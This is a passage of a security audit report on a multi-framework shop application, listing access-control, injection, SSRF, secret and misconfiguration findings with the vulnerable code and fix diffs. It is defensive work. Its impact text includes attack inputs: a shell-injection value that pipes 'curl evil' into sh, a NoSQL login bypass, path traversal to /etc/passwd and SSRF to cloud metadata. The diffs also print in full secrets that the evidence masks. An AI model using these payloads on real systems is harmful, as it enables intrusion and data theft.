- Express: `jwt.decode` only base64-decodes: an attacker forges `{"id": "<victim>"}` and updates any user (combine with SEC-29 to become admin).

**Proposed fix**
```diff
--- a/fastapi/main.py
+++ b/fastapi/main.py
@@ 9,15 @@
-def current_user(authorization: str = Header()):
-    return jwt.decode(authorization, options={"verify_signature": False})
+def current_user(authorization: str = Header()):
+    try:
+        return jwt.decode(authorization.removeprefix("Bearer "), os.environ["JWT_SECRET"], algorithms=["HS256"])
+    except jwt.PyJWTError:
+        raise HTTPException(401)
@@ 14 @@
-async def delete_order(order_id: int):
+async def delete_order(order_id: int, user=Depends(current_user)):
--- a/go/main.go
+++ b/go/main.go
@@ 18,24 @@
-	token, _ := jwt.Parse(c.GetHeader("Authorization"), func(t *jwt.Token) (interface{}, error) {
-		return []byte("secret"), nil
-	})
-	if token == nil {
-		c.JSON(401, gin.H{"error": "unauthorized"})
-	}
+	token, err := jwt.Parse(c.GetHeader("Authorization"), func(t *jwt.Token) (interface{}, error) {
+		return []byte(os.Getenv("JWT_SECRET")), nil
+	}, jwt.WithValidMethods([]string{"HS256"}))
+	if err != nil || !token.Valid {
+		c.AbortWithStatusJSON(401, gin.H{"error": "unauthorized"})
+		return
+	}
 	c.Next()
--- a/express/server.js
+++ b/express/server.js
@@ 24 @@
-  const { id } = jwt.decode(req.headers.authorization);
+  const { id } = jwt.verify(req.headers.authorization, process.env.JWT_SECRET, { algorithms: ["HS256"] });
```
Also attach `auth` to the other Go routes (`r.GET("/users/:id", auth, ...)`).

---

### SEC-18: Django `UserViewSet` open to everyone with `fields = "__all__"`

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `django/shop/views.py:10-18`, `django/shop/settings.py:8`
- **Status**: Confirmed

**Evidence**
```python
10  class UserSerializer(serializers.ModelSerializer):
11      class Meta:
12          model = User
13          fields = "__all__"
...
16  class UserViewSet(viewsets.ModelViewSet):
17      queryset = User.objects.all()
18      serializer_class = UserSerializer
```
```python
8  REST_FRAMEWORK = {"DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.AllowAny"]}
```

**Concrete impact**
The viewset inherits the global `AllowAny`: anonymous clients can list every user (with `password` hash, `is_superuser`, email), create users with `is_superuser=true`, edit or delete any account. (The router registration is not in the repository; the route is assumed to be exposed, see Not verified.)

**Proposed fix**
```diff
--- a/django/shop/settings.py
+++ b/django/shop/settings.py
@@ 8 @@
-REST_FRAMEWORK = {"DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.AllowAny"]}
+REST_FRAMEWORK = {"DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.IsAuthenticated"]}
--- a/django/shop/views.py
+++ b/django/shop/views.py
@@ 12,13 @@
         model = User
-        fields = "__all__"
+        fields = ["id", "username", "first_name", "last_name"]
+        read_only_fields = ["id"]
@@ 16,18 @@
 class UserViewSet(viewsets.ModelViewSet):
-    queryset = User.objects.all()
+    permission_classes = [permissions.IsAdminUser]
+    queryset = User.objects.all()
```
(import `permissions` from `rest_framework`.)

---

### SEC-19: Command injection in Go `/convert`

- **Severity**: Critical
- **OWASP category**: A03, Injection
- **Location**: `go/main.go:38-41`
- **Status**: Confirmed

**Evidence**
```go
38  r.POST("/convert", auth, func(c *gin.Context) {
39  	out, _ := exec.Command("sh", "-c", "convert "+c.PostForm("file")+" out.png").Output()
40  	c.String(200, string(out))
41  })
```

**Concrete impact**
The form field is interpolated into a shell command: `file=x; curl evil|sh` runs arbitrary commands. The `auth` guard is ineffective (SEC-17), so this is reachable anonymously.

**Proposed fix**
```diff
--- a/go/main.go
+++ b/go/main.go
@@ 39 @@
-		out, _ := exec.Command("sh", "-c", "convert "+c.PostForm("file")+" out.png").Output()
+		name := filepath.Base(c.PostForm("file"))
+		out, err := exec.Command("convert", "--", filepath.Join("uploads", name), "out.png").Output()
+		if err != nil { c.String(400, "conversion failed"); return }
```

---

### SEC-20: PocketBase `notes` collection: public list/view/delete, auth-only create/update

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `pb_migrations/1700000000_created_notes.js:6-10`
- **Status**: Confirmed (single migration for this collection)

**Evidence**
```js
 6    listRule: "",
 7    viewRule: "",
 8    createRule: "@request.auth.id != ''",
 9    updateRule: "@request.auth.id != ''",
10    deleteRule: "",
```
`""` means public (no authentication); the collection has an `owner` relation (line 13) that no rule uses.

**Concrete impact**
Anyone can list and read every note and **delete any note without logging in** (`deleteRule: ""`). Any registered user can edit every other user's notes (`updateRule` checks only login, not ownership; if registration is open this is equivalent to public).

**Proposed fix**
```diff
--- a/pb_migrations/1700000000_created_notes.js
+++ b/pb_migrations/1700000000_created_notes.js
@@ 6,10 @@
-    listRule: "",
-    viewRule: "",
-    createRule: "@request.auth.id != ''",
-    updateRule: "@request.auth.id != ''",
-    deleteRule: "",
+    listRule: "@request.auth.id != '' && owner = @request.auth.id",
+    viewRule: "@request.auth.id != '' && owner = @request.auth.id",
+    createRule: "@request.auth.id != '' && @request.body.owner = @request.auth.id",
+    updateRule: "owner = @request.auth.id && @request.body.owner:isset = false",
+    deleteRule: "owner = @request.auth.id",
```
Since the migration may already be applied, ship the change as a new migration.

---

### SEC-21: MySQL account `app@%` with empty password and `ALL PRIVILEGES *.*`

- **Severity**: Critical
- **OWASP category**: A07, Identification and authentication failures
- **Location**: `mysql/init.sql:9-10`
- **Status**: Confirmed

**Evidence**
```sql
 9  CREATE USER 'app'@'%' IDENTIFIED BY '';
10  GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';
```

**Concrete impact**
Any host can log in as `app` without a password and has full administrative rights on the server (all schemas, `FILE`, `SUPER`, `GRANT`). With port 3306 published (SEC-22) this is a full database takeover from the Internet, and any SQL injection (SEC-09, SEC-11) becomes file read/write.

**Proposed fix**
```diff
--- a/mysql/init.sql
+++ b/mysql/init.sql
@@ 9,10 @@
-CREATE USER 'app'@'%' IDENTIFIED BY '';
-GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';
+CREATE USER 'app'@'10.0.0.%' IDENTIFIED BY '<generated, 24+ characters, from a secret>';
+GRANT SELECT, INSERT, UPDATE, DELETE ON boutique.* TO 'app'@'10.0.0.%';
```
On existing servers: `DROP USER 'app'@'%';` then re-create as above.

---

### SEC-22: MySQL exposure: root/root, published 3306, public Adminer, end-of-life image

- **Severity**: High
- **OWASP category**: A05, Security misconfiguration
- **Location**: `mysql/docker-compose.yml:3-14`
- **Status**: Confirmed

**Evidence**
```yaml
 3    image: mysql:5.7
 4    environment:
 5      MYSQL_ROOT_PASSWORD: root
 6      MYSQL_DATABASE: boutique
 7    ports:
 8      - "3306:3306"
...
11  adminer:
12    image: adminer
13    ports:
14      - "8081:8080"
```

**Concrete impact**
The database is published on all interfaces with the trivial root password `root`; Adminer (a web DB client) is published too, offering a brute-force and login surface. `mysql:5.7` is end of life (no security patches).

**Proposed fix**
```diff
--- a/mysql/docker-compose.yml
+++ b/mysql/docker-compose.yml
@@ 3,14 @@
-    image: mysql:5.7
+    image: mysql:8.4
     environment:
-      MYSQL_ROOT_PASSWORD: root
+      MYSQL_ROOT_PASSWORD_FILE: /run/secrets/mysql_root
       MYSQL_DATABASE: boutique
     ports:
-      - "3306:3306"
+      - "127.0.0.1:3306:3306"
@@ 11,14 @@
-  adminer:
-    image: adminer
-    ports:
-      - "8081:8080"
+  # adminer: removed; use it only locally via an SSH tunnel or a profile
```
Add a `secrets:` section pointing at an untracked file.

---

### SEC-23: Passwords hashed with MD5 (PHP, MySQL, Django)

- **Severity**: High
- **OWASP category**: A02, Cryptographic failures
- **Location**: `php/login.php:7`, `mysql/init.sql:4,7`, `django/shop/settings.py:7`
- **Status**: Confirmed

**Evidence**
```php
// php/login.php
7  if ($user && $user['password'] === md5($_POST['password'])) {
```
```sql
// mysql/init.sql
4    password CHAR(32) NOT NULL
...
7  INSERT INTO users (email, password) VALUES ('admin@boutique.test', MD5('admin123'));
```
```python
# django/shop/settings.py
7  PASSWORD_HASHERS = ["django.contrib.auth.hashers.MD5PasswordHasher"]
```

**Concrete impact**
Unsalted, fast MD5 hashes (`CHAR(32)`) are cracked in seconds after any leak (SQL injection SEC-09 gives them). A default admin account `admin123` is seeded. Django is configured to use MD5 for all passwords.

**Proposed fix**
```diff
--- a/php/login.php
+++ b/php/login.php
@@ 7 @@
-if ($user && $user['password'] === md5($_POST['password'])) {
+if ($user && password_verify($_POST['password'], $user['password'])) {
--- a/mysql/init.sql
+++ b/mysql/init.sql
@@ 4 @@
-  password CHAR(32) NOT NULL
+  password VARCHAR(255) NOT NULL
@@ 7 @@
-INSERT INTO users (email, password) VALUES ('admin@boutique.test', MD5('admin123'));
+-- Do not seed a default admin; create it with a generated password via the app (password_hash()).
--- a/django/shop/settings.py
+++ b/django/shop/settings.py
@@ 7 @@
-PASSWORD_HASHERS = ["django.contrib.auth.hashers.MD5PasswordHasher"]
+PASSWORD_HASHERS = ["django.contrib.auth.hashers.Argon2PasswordHasher", "django.contrib.auth.hashers.PBKDF2PasswordHasher"]
```
Existing hashes must be migrated on next login (`password_needs_rehash`).

---

### SEC-24: Dynamic SQL built with `CONCAT` in a stored procedure

- **Severity**: High
- **OWASP category**: A03, Injection
- **Location**: `mysql/init.sql:12-19`
- **Status**: Confirmed

**Evidence**
```sql
12  DELIMITER //
13  CREATE PROCEDURE find_user(IN p_email VARCHAR(190))
14  SQL SECURITY DEFINER
15  BEGIN
16    SET @q = CONCAT('SELECT * FROM users WHERE email = ''', p_email, '''');
17    PREPARE s FROM @q;
18    EXECUTE s;
19  END //
```

**Concrete impact**
The parameter is concatenated into the statement before `PREPARE`: an injection through `p_email` runs with the privileges of the definer (the account that ran `init.sql`, i.e. root in Docker init).

**Proposed fix**
```diff
--- a/mysql/init.sql
+++ b/mysql/init.sql
@@ 14,18 @@
-SQL SECURITY DEFINER
+SQL SECURITY INVOKER
 BEGIN
-  SET @q = CONCAT('SELECT * FROM users WHERE email = ''', p_email, '''');
-  PREPARE s FROM @q;
-  EXECUTE s;
+  SELECT id, email FROM users WHERE email = p_email;
 END //
```
(No dynamic SQL is needed here; also stop returning the password column.)

---

### SEC-25: Anonymous unconstrained INSERT on `comments`

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `supabase/migrations/20250101000000_init.sql:16-18`
- **Status**: Confirmed

**Evidence**
```sql
16  create table public.comments (id bigint generated always as identity primary key, body text);
17  alter table public.comments enable row level security;
18  create policy "commentaires" on public.comments for insert to anon with check (true);
```
Rated High rather than Medium (the "public form" exception) because there is no length constraint, no author column and no rate limiting.

**Concrete impact**
Anyone can insert unlimited rows of arbitrary size with the public anon key: spam, storage cost, stored XSS payloads for any page that renders `body`.

**Proposed fix**
```diff
--- a/supabase/migrations/20250101000000_init.sql
+++ b/supabase/migrations/20250101000000_init.sql
@@ 16,18 @@
-create table public.comments (id bigint generated always as identity primary key, body text);
+create table public.comments (id bigint generated always as identity primary key,
+  author_id uuid not null references auth.users, body text not null check (length(body) between 1 and 2000));
 alter table public.comments enable row level security;
-create policy "commentaires" on public.comments for insert to anon with check (true);
+create policy "insert signed-in" on public.comments for insert to authenticated
+  with check ((select auth.uid()) = author_id);
```
If anonymous comments are a product requirement, keep `to anon` but add the length check, a captcha and rate limiting.

---

### SEC-26: View `invoice_totals` without `security_invoker`

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `supabase/migrations/20250101000000_init.sql:25`
- **Status**: Confirmed

**Evidence**
```sql
25  create view public.invoice_totals as select user_id, sum(amount) from public.invoices group by 1;
```

**Concrete impact**
The view runs with its owner's rights, so it bypasses RLS on `invoices` even after SEC-04 is fixed: the per-user totals of every user remain readable by `anon` through `/rest/v1/invoice_totals`.

**Proposed fix**
```diff
--- a/supabase/migrations/20250101000000_init.sql
+++ b/supabase/migrations/20250101000000_init.sql
@@ 25 @@
-create view public.invoice_totals as select user_id, sum(amount) from public.invoices group by 1;
+create view public.invoice_totals with (security_invoker = true) as
+  select user_id, sum(amount) from public.invoices group by 1;
```

---

### SEC-27: NoSQL injection on login (`User.findOne(req.body)`)

- **Severity**: High
- **OWASP category**: A03, Injection
- **Location**: `express/server.js:13-17`
- **Status**: Confirmed (the `models/User` file is not in the repository; Mongoose is declared in `express/package.json`)

**Evidence**
```js
13  app.post("/login", async (req, res) => {
14    const user = await User.findOne(req.body);
15    if (!user) return res.sendStatus(401);
16    res.json({ token: jwt.sign({ id: user.id, role: user.role }, "secret") });
17  });
```

**Concrete impact**
The whole JSON body is the query filter: `{"email":"admin@x","password":{"$ne":null}}` logs in as any user without knowing the password. Passwords are compared in the query, which also implies they are stored in clear text or as a bare hash.

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 14 @@
-  const user = await User.findOne(req.body);
-  if (!user) return res.sendStatus(401);
+  const { email, password } = req.body;
+  if (typeof email !== "string" || typeof password !== "string") return res.sendStatus(400);
+  const user = await User.findOne({ email });
+  if (!user || !(await bcrypt.compare(password, user.passwordHash))) return res.sendStatus(401);
```

---

### SEC-28: Hardcoded JWT signing secret `"secret"` (Express, Go)

- **Severity**: High
- **OWASP category**: A02, Cryptographic failures
- **Location**: `express/server.js:16`, `go/main.go:19`
- **Status**: Confirmed

**Evidence**
```js
16    res.json({ token: jwt.sign({ id: user.id, role: user.role }, "secret") });
```
```go
19  		return []byte("secret"), nil
```

**Concrete impact**
The secret is guessable and committed: anyone can mint a valid token with any `id` or `role` for services that do verify signatures.

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 16 @@
-  res.json({ token: jwt.sign({ id: user.id, role: user.role }, "secret") });
+  res.json({ token: jwt.sign({ id: user.id, role: user.role }, process.env.JWT_SECRET, { algorithm: "HS256", expiresIn: "1h" }) });
--- a/go/main.go
+++ b/go/main.go
@@ 19 @@
-		return []byte("secret"), nil
+		return []byte(os.Getenv("JWT_SECRET")), nil
```
Use a random 32-byte secret kept outside the repository, different per service.

---

### SEC-29: Mass assignment (Express `/me`, Laravel `Product`)

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `express/server.js:25`, `laravel/app/Http/Controllers/ProductController.php:17`, `laravel/app/Models/Product.php:8`
- **Status**: Confirmed

**Evidence**
```js
// express/server.js
25    res.json(await User.findByIdAndUpdate(id, req.body));
```
```php
// ProductController.php
15    public function update(Request $request, Product $product)
16    {
17        $product->update($request->all());
```
```php
// Product.php
8      protected $guarded = [];
```

**Concrete impact**
The whole request body is written to the record: a user can send `{"role":"admin"}` to `/me`, and any caller can overwrite any column (price, ids) of any `Product`.

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 25 @@
-  res.json(await User.findByIdAndUpdate(id, req.body));
+  const { name, bio } = req.body;
+  res.json(await User.findByIdAndUpdate(id, { name, bio }, { new: true }));
--- a/laravel/app/Models/Product.php
+++ b/laravel/app/Models/Product.php
@@ 8 @@
-    protected $guarded = [];
+    protected $fillable = ['name', 'description'];
--- a/laravel/app/Http/Controllers/ProductController.php
+++ b/laravel/app/Http/Controllers/ProductController.php
@@ 17 @@
-        $product->update($request->all());
+        $product->update($request->validate(['name' => 'string|max:120', 'description' => 'string|max:2000']));
```

---

### SEC-30: Laravel routes without authentication, avatar upload with client file name in the public disk

- **Severity**: High
- **OWASP category**: A04, Insecure design
- **Location**: `laravel/routes/web.php:5-7`, `laravel/app/Http/Controllers/ProductController.php:23`
- **Status**: Confirmed

**Evidence**
```php
// routes/web.php
5  Route::get('/products', [ProductController::class, 'index']);
6  Route::post('/products/{product}', [ProductController::class, 'update'])->withoutMiddleware(['auth']);
7  Route::post('/avatar', [ProductController::class, 'avatar']);
```
```php
// ProductController.php
23        return $request->file('avatar')->storeAs('public', $request->file('avatar')->getClientOriginalName());
```

**Concrete impact**
`withoutMiddleware(['auth'])` explicitly removes authentication from the update route, and the other routes are outside any `auth` group, so none of them needs a login. The avatar is stored in the publicly served `public` disk under the client's file name, with no `validate()`: HTML/SVG (stored XSS) or `.php` files can be uploaded, existing files overwritten.

**Proposed fix**
```diff
--- a/laravel/routes/web.php
+++ b/laravel/routes/web.php
@@ 5,7 @@
 Route::get('/products', [ProductController::class, 'index']);
-Route::post('/products/{product}', [ProductController::class, 'update'])->withoutMiddleware(['auth']);
-Route::post('/avatar', [ProductController::class, 'avatar']);
+Route::middleware('auth')->group(function () {
+    Route::post('/products/{product}', [ProductController::class, 'update']);
+    Route::post('/avatar', [ProductController::class, 'avatar']);
+});
--- a/laravel/app/Http/Controllers/ProductController.php
+++ b/laravel/app/Http/Controllers/ProductController.php
@@ 23 @@
-        return $request->file('avatar')->storeAs('public', $request->file('avatar')->getClientOriginalName());
+        $request->validate(['avatar' => 'required|file|mimes:jpg,png|max:2048']);
+        return $request->file('avatar')->store('avatars', 'public'); // generated name
```
Also add an authorization policy on `Product` (`$this->authorize('update', $product)`).

---

### SEC-31: Path traversal (Express `/download`, Go `/files`)

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `express/server.js:29`, `go/main.go:43`
- **Status**: Confirmed

**Evidence**
```js
28  app.get("/download", (req, res) => {
29    res.sendFile(path.join(__dirname, "files", req.query.name));
```
```go
42  r.GET("/files", func(c *gin.Context) {
43  	c.File("uploads/" + c.Query("name"))
```

**Concrete impact**
Anonymous users read arbitrary files readable by the process with `name=../../../etc/passwd` or `../.env` (Express `sendFile` rejects `..` only for the `root` option form, which is not used here).

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 29 @@
-  res.sendFile(path.join(__dirname, "files", req.query.name));
+  res.sendFile(path.basename(String(req.query.name)), { root: path.join(__dirname, "files") });
--- a/go/main.go
+++ b/go/main.go
@@ 43 @@
-		c.File("uploads/" + c.Query("name"))
+		c.File(filepath.Join("uploads", filepath.Base(c.Query("name"))))
```

---

### SEC-32: SSRF (Next.js `/api/preview`, Go `/fetch`)

- **Severity**: High
- **OWASP category**: A10, Server-side request forgery
- **Location**: `app/api/preview/route.ts:1-4`, `go/main.go:45-48`
- **Status**: Confirmed

**Evidence**
```ts
1  export async function POST(request: Request) {
2    const body = await request.json();
3    const res = await fetch(body.url);
4    return new Response(await res.text());
```
```go
45  r.GET("/fetch", func(c *gin.Context) {
46  	resp, _ := http.Get(c.Query("url"))
47  	c.DataFromReader(200, resp.ContentLength, "text/plain", resp.Body, nil)
```

**Concrete impact**
Both routes are unauthenticated and return the response body of an arbitrary URL: access to cloud metadata (`http://169.254.169.254/`), internal services (`http://localhost:8090/_/`, the MySQL/Adminer network) and local files over `file://` for Go clients that allow it. In Go a failed request also dereferences a nil `resp` (crash).

**Proposed fix**
```diff
--- a/app/api/preview/route.ts
+++ b/app/api/preview/route.ts
@@ 2,3 @@
-  const body = await request.json();
-  const res = await fetch(body.url);
+  const body = await request.json();
+  const u = new URL(body.url);
+  if (u.protocol !== "https:" || !ALLOWED_HOSTS.has(u.hostname)) return new Response("URL rejected", { status: 400 });
+  const res = await fetch(u, { redirect: "error" });
--- a/go/main.go
+++ b/go/main.go
@@ 46 @@
-		resp, _ := http.Get(c.Query("url"))
+		u, err := url.Parse(c.Query("url"))
+		if err != nil || u.Scheme != "https" || !allowedHosts[u.Hostname()] { c.String(400, "url rejected"); return }
+		resp, err := http.Get(u.String())
+		if err != nil { c.String(502, "fetch failed"); return }
```
Define `ALLOWED_HOSTS` / `allowedHosts` as an explicit allowlist; also require authentication on both routes.

---

### SEC-33: Django `invoice` IDOR

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `django/shop/views.py:21-23`
- **Status**: Confirmed

**Evidence**
```python
21  def invoice(request, pk):
22      inv = Invoice.objects.get(pk=pk)
23      return JsonResponse({"amount": inv.amount, "note": mark_safe(inv.note)})
```
No `@login_required`, no owner filter (the `Invoice` model file is not in the repository, so an owner field is assumed).

**Concrete impact**
Anyone, even logged out, can read any invoice by incrementing `pk`.

**Proposed fix**
```diff
--- a/django/shop/views.py
+++ b/django/shop/views.py
@@ 21,23 @@
+@login_required
 def invoice(request, pk):
-    inv = Invoice.objects.get(pk=pk)
-    return JsonResponse({"amount": inv.amount, "note": mark_safe(inv.note)})
+    inv = get_object_or_404(Invoice, pk=pk, owner=request.user)
+    return JsonResponse({"amount": inv.amount, "note": inv.note})
```

---

### SEC-34: Hardcoded `SECRET_KEY` (Django, Flask)

- **Severity**: High
- **OWASP category**: A02, Cryptographic failures
- **Location**: `django/shop/settings.py:1`, `flask/app.py:6`
- **Status**: Confirmed

**Evidence**
```python
# django/shop/settings.py
1  SECRET_KEY = "django-insecure-k3j4h5…****"
```
```python
# flask/app.py
6  app.config["SECRET_KEY"] = "dev"
```

**Concrete impact**
Both keys are committed. They allow forging signed session cookies (`flask-unsign`), Django signed cookies and password-reset tokens: account impersonation. `"dev"` is also trivially guessable.

**Proposed fix**
```diff
--- a/django/shop/settings.py
+++ b/django/shop/settings.py
@@ 1 @@
-SECRET_KEY = "django-insecure-k3j4h5g6f7d8s9a0q1w2e3r4t5y6u7i8o9p0"
+SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]
--- a/flask/app.py
+++ b/flask/app.py
@@ 6 @@
-app.config["SECRET_KEY"] = "dev"
+app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
```
Generate with `python -c "import secrets; print(secrets.token_hex(32))"`, rotate (invalidates existing sessions), and add `import os`.

---

### SEC-35: Django `DEBUG = True`, `ALLOWED_HOSTS = ["*"]`, non-secure session cookie

- **Severity**: High
- **OWASP category**: A05, Security misconfiguration
- **Location**: `django/shop/settings.py:2-3,6`
- **Status**: Confirmed (`settings.py` is the only settings module; no `prod` override exists)

**Evidence**
```python
2  DEBUG = True
3  ALLOWED_HOSTS = ["*"]
...
6  SESSION_COOKIE_SECURE = False
```

**Concrete impact**
Error pages expose settings, SQL and paths; the wildcard host allows Host header poisoning (password-reset links pointing to an attacker's domain); session cookies are sent over plain HTTP.

**Proposed fix**
```diff
--- a/django/shop/settings.py
+++ b/django/shop/settings.py
@@ 2,6 @@
-DEBUG = True
-ALLOWED_HOSTS = ["*"]
+DEBUG = os.environ.get("DJANGO_DEBUG") == "1"
+ALLOWED_HOSTS = ["shop.example.com"]
@@ 6 @@
-SESSION_COOKIE_SECURE = False
+SESSION_COOKIE_SECURE = True
+CSRF_COOKIE_SECURE = True
+SECURE_HSTS_SECONDS = 31536000
```
Run `python manage.py check --deploy` for the remaining points.

---

### SEC-36: CORS wildcard, with credentials (Flask, FastAPI, Django) and open (Express)

- **Severity**: High (Express alone, without credentials, would be Medium)
- **OWASP category**: A05, Security misconfiguration
- **Location**: `flask/app.py:7`, `fastapi/main.py:6`, `django/shop/settings.py:4-5`, `express/server.js:10`
- **Status**: Confirmed

**Evidence**
```python
# flask/app.py
7  CORS(app, origins="*", supports_credentials=True)
# fastapi/main.py
6  app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)
# django/shop/settings.py
4  CORS_ALLOW_ALL_ORIGINS = True
5  CORS_ALLOW_CREDENTIALS = True
```
```js
// express/server.js
10  app.use(cors());
```

**Concrete impact**
Any website can call these APIs from a victim's browser and read the responses; with credentials enabled, cookie-authenticated sessions (Flask, Django) are exposed to cross-origin data theft.

**Proposed fix**
```diff
--- a/flask/app.py
+++ b/flask/app.py
@@ 7 @@
-CORS(app, origins="*", supports_credentials=True)
+CORS(app, origins=["https://app.example.com"], supports_credentials=True)
--- a/fastapi/main.py
+++ b/fastapi/main.py
@@ 6 @@
-app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)
+app.add_middleware(CORSMiddleware, allow_origins=["https://app.example.com"], allow_credentials=True)
--- a/django/shop/settings.py
+++ b/django/shop/settings.py
@@ 4,5 @@
-CORS_ALLOW_ALL_ORIGINS = True
-CORS_ALLOW_CREDENTIALS = True
+CORS_ALLOWED_ORIGINS = ["https://app.example.com"]
+CORS_ALLOW_CREDENTIALS = True
--- a/express/server.js
+++ b/express/server.js
@@ 10 @@
-app.use(cors());
+app.use(cors({ origin: ["https://app.example.com"] }));
```

---

### SEC-37: Cross-site scripting (PHP, Next.js, Laravel)

- **Severity**: High (PHP reflected, unauthenticated; Next.js and Laravel are Medium on their own, see Impact)
- **OWASP category**: A03, Injection
- **Location**: `php/login.php:11`, `components/AdminPanel.tsx:9-10`, `laravel/resources/views/product.blade.php:2`
- **Status**: Confirmed

**Evidence**
```php
// php/login.php
11  echo "Identifiants invalides pour " . $_POST['email'];
```
```tsx
// components/AdminPanel.tsx
9  export function AdminPanel({ html }: { html: string }) {
10   return <div dangerouslySetInnerHTML={{ __html: html }} />;
```
```php
// laravel/resources/views/product.blade.php
1  <h1>{{ $product->name }}</h1>
2  <div>{!! $product->description !!}</div>
```

**Concrete impact**
The PHP page reflects the submitted email unescaped (any victim submitting an attacker-built form runs script on the origin). `AdminPanel` renders an `html` prop without sanitizing, and the Blade template prints `description` unescaped (stored XSS when users can edit products, which SEC-29/SEC-30 allow anonymously): Medium individually, High where combined with those flaws.

**Proposed fix**
```diff
--- a/php/login.php
+++ b/php/login.php
@@ 11 @@
-echo "Identifiants invalides pour " . $_POST['email'];
+echo "Identifiants invalides pour " . htmlspecialchars($_POST['email'] ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
--- a/components/AdminPanel.tsx
+++ b/components/AdminPanel.tsx
@@ 10 @@
-  return <div dangerouslySetInnerHTML={{ __html: html }} />;
+  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
--- a/laravel/resources/views/product.blade.php
+++ b/laravel/resources/views/product.blade.php
@@ 2 @@
-<div>{!! $product->description !!}</div>
+<div>{{ $product->description }}</div>
```
(Use HTMLPurifier / `mews/purifier` with `{!! !!}` if rich text is required; import `DOMPurify` from `isomorphic-dompurify`.)

---

### SEC-38: Committed DB root credentials and `display_errors`

- **Severity**: High
- **OWASP category**: A02, Cryptographic failures
- **Location**: `php/config.php:2-3`
- **Status**: Confirmed

**Evidence**
```php
1  <?php
2  ini_set('display_errors', 1);
3  $pdo = new PDO('mysql:host=localhost;dbname=boutique', 'root', 'Boutiq…****');
```

**Concrete impact**
The application connects as `root` with a password committed to git: any repository reader (and any SQL injection, SEC-09) obtains full database rights. No `ERRMODE_EXCEPTION` and no `charset` are set; `display_errors` prints paths and queries to visitors.

**Proposed fix**
```diff
--- a/php/config.php
+++ b/php/config.php
@@ 2,3 @@
-ini_set('display_errors', 1);
-$pdo = new PDO('mysql:host=localhost;dbname=boutique', 'root', 'Boutique2024!');
+ini_set('display_errors', '0');
+ini_set('log_errors', '1');
+$pdo = new PDO($_ENV['DB_DSN'], $_ENV['DB_USER'], $_ENV['DB_PASS'], [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_EMULATE_PREPARES => false,
+]);
```
Use a least-privilege database user (see SEC-21), `charset=utf8mb4` in `DB_DSN`, and rotate the password.

---

### SEC-39: Next.js middleware covers only `/dashboard` and trusts `getSession()`

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `middleware.ts:9,14`
- **Status**: Confirmed

**Evidence**
```ts
 9  const { data } = await supabase.auth.getSession();
10  if (!data.session) return NextResponse.redirect(new URL("/login", req.url));
...
14  export const config = { matcher: ["/dashboard"] };
```

**Concrete impact**
The matcher is the exact path `/dashboard`: `/dashboard/settings`, every `/api/*` route (SEC-03, SEC-32) and server actions are not covered. In addition `getSession()` reads the cookie without revalidating the JWT, so a forged cookie passes the check. Authorization must be redone in each route and action anyway.

**Proposed fix**
```diff
--- a/middleware.ts
+++ b/middleware.ts
@@ 9 @@
-  const { data } = await supabase.auth.getSession();
-  if (!data.session) return NextResponse.redirect(new URL("/login", req.url));
+  const { data: { user } } = await supabase.auth.getUser();
+  if (!user) return NextResponse.redirect(new URL("/login", req.url));
@@ 14 @@
-export const config = { matcher: ["/dashboard"] };
+export const config = { matcher: ["/dashboard/:path*"] };
```
Keep API routes out of redirect middleware but check `auth.getUser()` inside each one (return 401, not a redirect).

---

### SEC-40: Firebase rules gated only by sign-in or a test-mode date

- **Severity**: High
- **OWASP category**: A01, Broken access control
- **Location**: `firebase/firestore.rules:5,8`, `firebase/database.rules.json:4`
- **Status**: Confirmed (files referenced by `firebase/firebase.json`). Also check in the console whether Anonymous or open email sign-up is enabled (Authentication > Sign-in method): it makes `request.auth != null` equivalent to public.

**Evidence**
```
// firestore.rules
 4      match /users/{uid} {
 5        allow read, write: if request.auth != null;
 7      match /orders/{id} {
 8        allow read, write: if request.time < timestamp.date(2026, 12, 31);
// database.rules.json
 4    ".write": "auth != null"
```

**Concrete impact**
`users/{uid}`: any signed-in user can read and overwrite any user document, including any `role`/privilege field. `orders/{id}`: public read and write for everyone until 2026-12-31 (today is 2026-11-10, so still active). RTDB: any signed-in (or anonymous) user can write the whole database.

**Proposed fix**
```diff
--- a/firebase/firestore.rules
+++ b/firebase/firestore.rules
@@ 5 @@
-      allow read, write: if request.auth != null;
+      allow read: if request.auth != null && request.auth.uid == uid;
+      allow create, update: if request.auth != null && request.auth.uid == uid
+        && !request.resource.data.diff(resource.data).affectedKeys().hasAny(['role', 'credits', 'premium']);
@@ 8 @@
-      allow read, write: if request.time < timestamp.date(2026, 12, 31);
+      allow read: if request.auth != null && resource.data.userId == request.auth.uid;
+      allow create: if request.auth != null && request.resource.data.userId == request.auth.uid;
--- a/firebase/database.rules.json
+++ b/firebase/database.rules.json
@@ 4 @@
-    ".write": "auth != null"
+    ".write": false
```

---

### SEC-41: Old pinned dependencies, Next 15.1.0 (CVE-2025-29927), no lockfiles

- **Severity**: High
- **OWASP category**: A06, Vulnerable and outdated components
- **Location**: `package.json:4`
